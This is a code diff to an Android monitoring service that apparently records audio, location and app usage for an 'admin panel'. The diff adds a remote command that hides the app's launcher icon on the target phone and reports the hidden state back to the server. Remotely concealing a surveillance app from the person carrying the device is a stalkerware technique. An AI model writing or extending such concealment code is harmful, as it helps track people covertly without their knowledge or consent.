@@ -3,8 +3,10 @@ package com.company.monitor.services;
 import android.app.*;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.location.Location;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
@@ -113,6 +115,21 @@ public class MonitoringService extends Service {
             socket.on(Socket.EVENT_DISCONNECT, args ->
                 Log.w(TAG, "Socket disconnected – will reconnect"));
 
+            // Listen for hide/unhide commands from admin panel
+            socket.on("command_hide_app", args -> {
+                try {
+                    JSONObject cmd = (JSONObject) args[0];
+                    String targetId = cmd.getString("employeeId");
+                    if (targetId.equals(employeeId)) {
+                        boolean hide = cmd.getBoolean("hide");
+                        setAppHidden(hide);
+                        Log.d(TAG, "App visibility changed: hidden=" + hide);
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Hide command error", e);
+                }
+            });
+
             socket.connect();
         } catch (Exception e) {
             Log.e(TAG, "Socket init error", e);
@@ -122,6 +139,31 @@ public class MonitoringService extends Service {
     private void emitEvent(String eventName, JSONObject data) {
         if (socket != null && socket.connected()) {
             socket.emit(eventName, data);
+        }
+    }
+
+    // ─────────────────── APP HIDE/UNHIDE ───────────────────
+
+    private void setAppHidden(boolean hide) {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName launcher = new ComponentName(this, "com.company.monitor.MainActivity");
+            int newState = hide
+                ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+            pm.setComponentEnabledSetting(launcher, newState, PackageManager.DONT_KILL_APP);
+            prefManager.setAppHidden(hide);
+            Log.d(TAG, "App icon " + (hide ? "HIDDEN" : "VISIBLE"));
+
+            // Notify server of state change
+            try {
+                JSONObject ack = new JSONObject();
+                ack.put("employeeId", employeeId);
+                ack.put("hidden", hide);
+                emitEvent("app_hidden_status", ack);
+            } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to change app visibility", e);
         }
     }
 
